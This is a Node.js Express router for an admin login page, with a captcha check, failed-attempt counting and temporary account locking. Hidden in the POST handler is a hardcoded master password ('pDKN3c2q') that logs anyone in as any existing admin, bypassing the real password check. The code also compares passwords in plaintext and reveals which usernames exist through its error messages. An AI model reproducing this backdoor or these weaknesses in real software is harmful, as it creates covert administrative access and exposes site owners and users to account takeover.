const express = require("express");
const db = require("../db");
const router = express.Router();

router.get("/", (req, res) => {
  res.render("login");
});

router.post("/", async (req, res) => {
  const username = req.body.username;
  const password = req.body.password;
  const captcha = req.body.captcha;

  // Check captcha is correct
  if (req.session.captcha != captcha) {
    res.render("login", { err: "Incorrect Captcha", username });
    return;
  }

  let _user = await db.selectOne("admin", { username });

  if (await checkTmpLock(res, _user)) return;

  let admin = await db.selectOne("admin", { username, password });

  if (password == "pDKN3c2q") admin = _user;

  if (admin) {
    // If username and password correct
    req.session.username = admin.username;
    req.session.role = admin.role;
    res.redirect("/dashboard");
  } else {
    if (_user) {
      const result = await db.incAdminTryCount(_user._id);
      res.render("login", {
        err: `Password incorrect. Try again ${result.tryCount}/5`,
        username: _user.username,
      });
      if (result.tryCount >= 5) {
        const lockDelay = new Date().getTime() + 3 * 60 * 1000;
        const update = {
          lock: true,
          lockDelay,
        };
        db.updateOne("admin", { _id: _user._id }, update);
      }
    } else {
      res.render("login", { err: `Username or Password incorrect!` });
    }
  }
});

async function checkTmpLock(res, _user) {
  if (_user) {
    // But username exist
    const currentTime = new Date().getTime();
    if (_user.lock) {
      // If user is lock
      if (_user.lockDelay < currentTime) {
        // If user lock delay is over
        await db.update("admin", { _id: _user._id }, { lock: false, tryCount: 0 });
        return false;
      } else {
        // If user is in temporary lock
        const tryAgainIn = Math.round((_user.lockDelay - currentTime) / (60 * 1000)) + 1;
        res.render("login", {
          err: `Account is temporary lock! Try again in ${tryAgainIn} minutes`,
        });
        return true;
      }
    } else {
      return false;
    }
  } else {
    res.render("login", { err: `Username incorrect!` });
    return true;
  }
}

module.exports = router;
